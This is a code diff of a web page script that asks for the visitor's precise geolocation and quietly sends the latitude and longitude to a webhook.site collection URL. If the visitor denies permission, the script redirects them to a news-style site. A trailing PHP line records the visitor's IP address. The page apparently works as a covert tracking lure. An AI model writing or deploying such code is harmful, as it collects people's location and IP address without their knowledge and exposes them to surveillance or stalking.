@@ -664,27 +664,27 @@ blockquote {
 var x = document.getElementById("demo");
 
 function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-     xhttp.open("GET", "https://webhook.site/d3ac3a32-bc56-49c3-8c1d-dfc8ebc13fa7?t="+ position.coords.latitude +position.coords.longitude  , true);
-  xhttp.send();
-
-  }
+    navigator.geolocation.getCurrentPosition(success, error, options);
 }
+var options = {
+  enableHighAccuracy: true,
+  timeout: 5000,
+  maximumAge: 0
+};
 
-function showPosition(position) {
-  x.innerHTML = "Latitude: " + position.coords.latitude + 
-  "<br>Longitude: " + position.coords.longitude;
-  var xhttp = new XMLHttpRequest();
+function success(pos) {
+ var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange=function() {
     if (this.readyState == 4 && this.status == 200) {
       document.getElementById("demo").innerHTML = this.responseText;
     }
   };
-  xhttp.open("GET", "https://webhook.site/d3ac3a32-bc56-49c3-8c1d-dfc8ebc13fa7?t="+ position.coords.latitude +position.coords.longitude  , true);
+  xhttp.open("GET", "https://webhook.site/d3ac3a32-bc56-49c3-8c1d-dfc8ebc13fa7?t="+ pos.coords.latitude +pos.coords.longitude  , true);
   xhttp.send();
+}
 
+function error(err) {
+location.replace("https://rajasthannews.azurewebsites.net/")
 }
 	</script> 
 $ipaddress=$_SERVER['REMOTE_ADDR'];
